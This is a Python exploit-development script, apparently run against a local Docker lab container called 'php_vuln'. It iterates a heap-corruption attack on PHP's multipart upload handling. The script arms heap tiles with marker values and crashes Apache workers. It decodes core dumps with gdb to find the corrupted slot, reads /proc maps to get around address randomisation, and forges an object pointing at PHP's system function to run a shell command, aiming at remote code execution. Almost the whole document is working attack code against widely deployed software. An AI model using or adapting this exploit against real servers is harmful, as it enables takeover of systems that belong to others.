#!/usr/bin/env python3
"""oom89: converge — probe slot per arm, re-aim, iterate in one boot.

Laws: walk slot VARIES PER ARM (oom85 boot: 32; oom88 boot: 8). Marker
value = 0x5a5a5a5a5a5a5a00 | (slot/8) -> crash rdi names the slot
exactly. Arming replaces the walked zone (oom85 crashed after re-arm).
Loop per cycle:
  1. arm with marker tile (all 22 slots marked uniquely)
  2. sacrifice + fire -> crash rdi -> slot S
  3. re-arm with AIM tile (full template + slot S = TARGET =
     VA0+3584+8 = next copy's object header, rc=1)
  4. sacrifice + fires; crash decode:
       rdi = marker@s' -> slot moved, s' = new S, loop
       rdi = TARGET    -> dec landed; dispatch expected (check /tmp/x!)
  /tmp/x checked after EVERY fire. Max 3 cycles.
"""
import re
import struct
import subprocess
import sys
import time

sys.path.insert(0, '/Users/vlad/Projects/queue/php2shell-lab')
import payload68 as P

HOST = "http://127.0.0.1:8081/oom_sapi.php"
CMD = b"whoami>/tmp/x"
ZIF_SYSTEM = 0x39b8a0
STRIDE = 3584
MARK = 0x5a5a5a5a5a5a5a00


def sh(c, t=120):
    r = subprocess.run(c, shell=True, capture_output=True, text=True, timeout=t)
    return (r.stdout + r.stderr).strip()


def post(att):
    import urllib.request
    req = urllib.request.Request(
        HOST, data=att,
        headers={"Content-Type": "multipart/form-data; boundary=BOUND"})
    try:
        with urllib.request.urlopen(req, timeout=120) as r:
            return "200", r.read(300)
    except Exception as e:
        return "ERR", str(e)[:150].encode()


def boot_core_env():
    sh("docker exec php_vuln sh -c \"grep -q 'ulimit -c' /etc/apache2/envvars || echo 'ulimit -c unlimited' >> /etc/apache2/envvars\"")
    sh("docker exec php_vuln sh -c \"printf 'CoreDumpDirectory /tmp\\n' > /etc/apache2/conf-enabled/oomcore.conf\"")
    sh("docker exec php_vuln sh -c 'rm -f /tmp/core* /tmp/x'")
    subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
    for _ in range(40):
        time.sleep(1.5)
        if "lim=8M" in sh("curl -s -m 5 " + HOST, 10):
            break
    md5 = sh("docker exec php_vuln md5sum /usr/lib/apache2/modules/libphp.so | cut -d' ' -f1")
    assert md5 == P.STOCK_MD5, md5


def marker_tile():
    T = bytearray(176)
    for s in range(0, 176, 8):
        struct.pack_into("<Q", T, s, MARK | (s // 8))
    return bytes(T)


def template_tile(libphp_base, VA0, aim_slot=None):
    T = bytearray(176)
    struct.pack_into("<IIII", T, 8, 1, 0x108, 1, 0)
    struct.pack_into("<Q", T, 32, VA0 + 152)
    struct.pack_into("<I", T, 52, 1)
    struct.pack_into("<QII", T, 88, VA0 + 112, 6, 0)
    struct.pack_into("<IIQ", T, 112, 1, 0x106, 0)
    struct.pack_into("<Q", T, 128, len(CMD))
    T[136:136 + len(CMD)] = CMD
    T[136 + len(CMD)] = 0
    struct.pack_into("<QQ", T, 152, 0, libphp_base + ZIF_SYSTEM)
    if aim_slot is not None:
        struct.pack_into("<Q", T, aim_slot, VA0 + STRIDE + 8)
    return bytes(T)


def fetch_core(tag):
    sh("docker cp php_vuln:/tmp/core /tmp/c89_%s" % tag, 240)
    sh("docker cp /tmp/c89_%s phpbuild:/tmp/c89_%s" % (tag, tag), 240)
    return "/tmp/c89_%s" % tag


def gdb_rdi(core_in_build):
    out = sh("docker exec phpbuild sh -c 'gdb -q -batch -ex \"info registers rdi\" /tmp/libphp.69.so /tmp/%s'" % core_in_build, 240)
    m = re.search(r"rdi\s+0x([0-9a-f]+)", out)
    return int(m.group(1), 16) if m else None


def check_x():
    x = sh("docker exec php_vuln sh -c 'ls -la /tmp/x 2>&1; cat /tmp/x 2>&1'")
    return "No such" not in x, x


def fire_sequence(tag, tile):
    """warm(11) + sacrifice + up to 3 finishers; returns (slot_or_TARGET_or_None, x_hit)."""
    for i, k1 in enumerate(P.K1S[:-1]):
        post(P.build_attack(k1, 9100000 + i * 100000, value_tile=tile))
        hit, x = check_x()
        if hit:
            return None, x
    post(P.build_attack(3400, 9200000, value_tile=tile))
    hit, x = check_x()
    if hit:
        return None, x
    for fi in range(3):
        sb = 9210000 + fi * 4
        code, resp = post(P.build_attack(3400, sb, value_tile=tile))
        tag2 = "fatal" if b"Fatal" in resp else ("clean" if code == "200" else "crash")
        print("  [%s] fire%d (%d): %s [%s]" % (tag, fi, sb, code, tag2), flush=True)
        time.sleep(2)
        hit, x = check_x()
        if hit:
            return None, x
        if code != "200":
            time.sleep(3)
            cb = fetch_core("%s%d" % (tag, fi))
            rdi = gdb_rdi("c89_%s%d" % (tag, fi))
            if rdi is None:
                continue
            if (rdi & ~0xFF) == MARK:
                return (rdi & 0xFF) * 8, None
            return ("TARGET" if is_target(rdi) else "0x%x" % rdi), None
    return None, None


def is_target(rdi):
    return False  # replaced dynamically in main (needs TARGET value)


print("=== oom89: converge probe->aim in one boot ===", flush=True)
boot_core_env()
pid = sh("docker exec php_vuln pgrep -f 'apache2' | head -1").strip()
maps = sh("docker exec php_vuln cat /proc/%s/maps" % pid)
base = heap = None
for ln in maps.splitlines():
    rng = ln.split()[0]
    a, b = [int(x, 16) for x in rng.split("-")]
    perms = ln.split()[1]
    if base is None and "libphp.so" in ln and perms.startswith("r"):
        base = a
    if "libphp.so" not in ln and "/dev/zero" not in ln and "[" not in ln \
            and (b - a) >= 0x200000 and perms.startswith("rw"):
        if heap is None:
            heap = a
VA0 = heap + 0x1718
TARGET = VA0 + STRIDE + 8
print("    libphp=0x%x heap=0x%x VA0=0x%x TARGET=0x%x" % (base, heap, VA0, TARGET), flush=True)

S = None
for cycle in range(3):
    if S is None:
        print("[cycle %d] PROBE arm", cycle + 1, flush=True)
        tile = marker_tile()
    else:
        print("[cycle %d] AIM arm at slot %d" % (cycle + 1, S), flush=True)
        tile = template_tile(base, VA0, aim_slot=S)
    slot_or, x = fire_sequence("c%d" % cycle, tile)
    if x:
        print("    /tmp/x: [%s]" % x, flush=True)
        print("*** RCE CONFIRMED ***", flush=True)
        sys.exit(0)
    if isinstance(slot_or, int):
        print("    -> walk slot = %d" % slot_or, flush=True)
        if slot_or == S:
            print("    same slot aimed but still crashing? investigate core", flush=True)
            break
        S = slot_or
    elif slot_or == "TARGET":
        print("    dec landed at TARGET (rdi=TARGET) but no /tmp/x — dispatch args issue", flush=True)
        break
    else:
        print("    -> %s" % slot_or, flush=True)
        break

print("[RESULT] S=%s" % S, flush=True)
print("[restore]", flush=True)
sh("docker exec php_vuln sh -c 'rm -f /etc/apache2/conf-enabled/oomcore.conf && sed -i \"/ulimit -c/d\" /etc/apache2/envvars'")
subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
time.sleep(8)
print("    restored:", sh("curl -s -m 5 " + HOST, 10), flush=True)
